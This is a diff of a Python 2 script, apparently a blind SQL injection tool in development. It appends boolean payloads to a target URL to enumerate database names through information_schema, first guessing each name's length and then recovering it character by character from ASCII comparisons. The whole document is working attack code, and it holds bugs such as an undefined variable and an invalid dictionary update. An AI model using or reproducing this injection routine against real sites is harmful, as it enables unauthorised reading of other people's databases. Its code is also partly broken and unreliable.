@@ -48,16 +48,18 @@ python sql.py TODO include args"""
     dump                = options.DUMP
     database            = options.DATABASE
 
-    # TODO algo principal ici
-    # Enumerer le nombre de colonnes de la table courante pour l'injection
-    # Trouver la version du serveur SQL
-    sql_version(url,payload, bypass)
-    eunum_databases(url, payload, bypass)
-    # Récupérer la base de données courantes et les autres bases de données
-    # Pour chaque base database
-        # Récupérer les tables
-        # Pour chaque table
-            # Récupérer le nombre de colonnes
+    global session
+    with requests.session() as session:
+        # TODO algo principal ici
+        # Enumerer le nombre de colonnes de la table courante pour l'injection
+        # Trouver la version du serveur SQL
+        sql_version(url,payload, bypass)
+        eunum_databases(url, payload, bypass)
+        # Récupérer la base de données courantes et les autres bases de données
+        # Pour chaque base database
+            # Récupérer les tables
+            # Pour chaque table
+                # Récupérer le nombre de colonnes
 
 # --------- Find SQL database version ----------
 def sql_version(url, payload, bypass):
@@ -81,10 +83,6 @@ def sql_version(url, payload, bypass):
 
     return server_version
 
-# --------- Find the numer of columns ----------
-def enum_columns(url, payload, bypass, database, table):
-    pass
-
 # --------- Enumerate databases ----------
 def eunum_databases(url, payload, bypass):
     '''
@@ -103,6 +101,7 @@ def eunum_databases(url, payload, bypass):
     while (database_increment < 64):
         # uri = url + "' and substring((select schema_name from information_schema.schemata limit " + str(database_increment) + ",1),1,1)>=0" + bypass
         uri = url + str(payload) + "substring((select schema_name from information_schema.schemata limit " + str(database_increment) + ",1),1,1)>=0" + bypass
+        # print str(uri)
         server_response = request_handler(uri)
         server_response_status = validate_request(server_response)
 
@@ -112,18 +111,20 @@ def eunum_databases(url, payload, bypass):
 
             # Count how many letters in each database name
             for database_number in range(0,database_increment):
+
+
                 database_letter_count = 1
 
                 # Count how many chars in db name, we assume the database name to be less than 128 characters
                 while (database_letter_count < 128):
-                    # uri = url + "' and substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1),"+ str(database_letter_count) + ",1)>0" + bypass
-                    uri = url + str(payload) + "substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1),"+ str(database_letter_count) + ",1)>=0" + bypass
+                    # ' and (select length(schema_name) from information_schema.schemata limit 0,1)>=19 or '
+                    uri = url + str(payload) + "(select length(schema_name) from information_schema.schemata limit " + str(database_number) + ",1)>=" + str(database_letter_count) + bypass
                     server_response = request_handler(uri)
                     server_response_status = validate_request(server_response)
-                    print server_response_status, database_letter_count
+                    # print server_response_status, database_letter_count
 
                     if server_response_status is False:
-                        print 'Database ' + str(database_number) + ': has ' + str(database_letter_count) + ' letters'
+                        print 'Database ' + str(database_number) + ': has ' + str(database_letter_count - 1) + ' letters'
                         database_name = ""
 
                         # Get the databases names
@@ -131,23 +132,28 @@ def eunum_databases(url, payload, bypass):
 
                             # Loop in ascii range to guess each character
                             for database_letter in range(1,128):
-                                uri = url + str(payload) + "ascii(substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1)," + str(database_letter_count) + ",1))>=" + str(database_letter) + bypass
+                                uri = url + str(payload) + "ascii(substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1)," + str(letter_count) + ",1))>=" + str(database_letter) + bypass
+                                # print str(uri)
 
                                 server_response = request_handler(uri)
                                 server_response_status = validate_request(server_response)
 
                                 # If status is false then database_letter - 1 was the n-th char of the database name
                                 if server_response_status is False:
-                                    database_name = database_name + str(ord(database_letter - 1))
+                                    database_name += str(chr(database_letter - 1))
+                                    print "Database name: " + str(database_name)
+                                    break
 
                     # elif server_response_status is True:
                     database_letter_count = database_letter_count + 1
 
-                database_name += database_name
                 print database_name
+                dump[database_name] += {}
 
         elif server_response_status is True:
             database_increment = database_increment + 1
+
+    print dump
 
 # --------- Enumerate database tables ----------
 def enum_tables(url, payload, bypass, database):
@@ -211,19 +217,23 @@ def enum_tables(url, payload, bypass, database):
             elif server_response_status is True:
                 tables_increment = tables_increment + 1
 
+# --------- Find the numer of columns ----------
+def enum_columns(url, payload, bypass, database, table):
+    pass
+
 # --------- Dump the database ----------
 def exfiltrate_data(url, payload, bypass, database):
     pass
 
 # --------- Forge & send HTTP requests ----------
 def request_handler(url):
-    # Create session if it doesn't exist
-#    if not session:
-#        session = requests.session()
-#    page = session.get(url)
+# Create session if it doesn't exist
+    # if not session:
+    #     session = requests.session()
+    page = session.get(url)
 
-    with requests.session() as session:
-        page = session.get(url)
+    # with requests.session() as session:
+    #     page = session.get(url)
     return page.content
 
 # --------- Confirm that request was executed ----------
